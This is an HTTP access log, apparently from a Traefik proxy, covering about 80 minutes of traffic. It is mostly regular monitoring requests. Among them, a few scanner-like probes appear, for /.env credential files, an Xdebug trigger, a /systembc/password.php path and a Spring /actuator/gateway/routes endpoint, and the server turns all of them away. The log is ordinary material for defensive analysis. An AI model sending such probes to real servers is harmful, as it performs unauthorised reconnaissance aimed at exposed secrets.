167.71.120.76 - - [14/Dec/2023:11:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1774 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1775 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1776 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1777 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1778 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1779 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1780 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1781 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1782 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1783 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1784 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1785 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1786 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1787 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1788 "www@docker" "http://172.25.0.8:80" 0ms
83.97.73.87 - - [14/Dec/2023:11:19:12 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1789 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1790 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1791 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1792 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1793 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1794 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1795 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1796 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1797 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1798 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1799 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1800 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1801 "www@docker" "http://172.25.0.8:80" 1ms
45.56.108.128 - - [14/Dec/2023:11:24:42 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 1802 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1803 "www@docker" "http://172.25.0.8:80" 4ms
167.71.120.76 - - [14/Dec/2023:11:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1804 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1805 "www@docker" "http://172.25.0.8:80" 0ms
90.151.171.106 - - [14/Dec/2023:11:26:28 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 1806 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [14/Dec/2023:11:26:38 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 1807 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:11:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1808 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1809 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1810 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1811 "www@docker" "http://172.25.0.8:80" 1ms
185.224.128.191 - - [14/Dec/2023:11:28:31 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1812 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:11:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1813 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:11:29:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1814 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1815 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1816 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:11:29:50 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1817 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:11:30:15 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1818 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1819 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1820 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1821 "www@docker" "http://172.25.0.8:80" 0ms
83.97.73.87 - - [14/Dec/2023:11:31:32 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 19 "-" "-" 1822 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:11:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1823 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1824 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1825 "www@docker" "http://172.25.0.8:80" 1ms
45.56.108.128 - - [14/Dec/2023:11:33:01 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 1826 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1827 "www@docker" "http://172.25.0.8:80" 1ms
103.207.38.26 - - [14/Dec/2023:11:33:30 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1828 "web-to-websecure@internal" "-" 0ms
103.207.38.26 - - [14/Dec/2023:11:33:30 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1829 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:11:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1830 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1831 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1832 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1833 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1834 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1835 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1836 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1837 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1838 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1839 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1840 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1841 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1842 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1843 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1844 "www@docker" "http://172.25.0.8:80" 1ms
68.69.186.30 - - [14/Dec/2023:11:40:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1845 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1846 "www@docker" "http://172.25.0.8:80" 0ms
51.81.46.212 - - [14/Dec/2023:11:41:33 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1847 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:11:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1848 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1849 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1850 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1851 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1852 "www@docker" "http://172.25.0.8:80" 0ms
117.62.218.192 - - [14/Dec/2023:11:44:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1853 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1854 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1855 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1856 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1857 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1858 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1859 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1860 "www@docker" "http://172.25.0.8:80" 1ms
95.214.235.169 - - [14/Dec/2023:11:47:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1861 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:11:47:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1862 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:11:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1863 "www@docker" "http://172.25.0.8:80" 1ms
5.196.69.140 - - [14/Dec/2023:11:47:59 +0000] "GET / HTTP/1.0" 301 17 "-" "-" 1864 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:11:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1865 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1866 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1867 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1868 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1869 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1870 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1871 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1872 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1873 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1874 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1875 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1876 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1877 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:11:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1878 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1879 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1880 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1881 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1882 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:11:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1883 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1884 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1885 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1886 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:11:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1887 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:11:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1888 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:11:59:55 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1889 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1890 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1891 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1892 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1893 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1894 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1895 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1896 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1897 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:12:04:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1898 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1899 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1900 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1901 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1902 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1903 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1904 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1905 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1906 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1907 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1908 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1909 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1910 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1911 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1912 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1913 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1914 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1915 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1916 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1917 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1918 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1919 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1920 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1921 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1922 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1923 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1924 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1925 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1926 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1927 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1928 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1929 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1930 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1931 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1932 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1933 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1934 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1935 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:12:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1936 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1937 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1938 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1939 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1940 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1941 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1942 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1943 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1944 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1945 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1946 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1947 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1948 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:12:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1949 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1950 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:12:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1951 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1952 "www@docker" "http://172.25.0.8:80" 0ms
83.97.73.87 - - [14/Dec/2023:12:31:04 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 1953 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:12:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1954 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:12:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1955 "www@docker" "http://172.25.0.8:80" 1ms
83.97.73.87 - - [14/Dec/2023:12:31:54 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 1956 "-" "-" 0ms
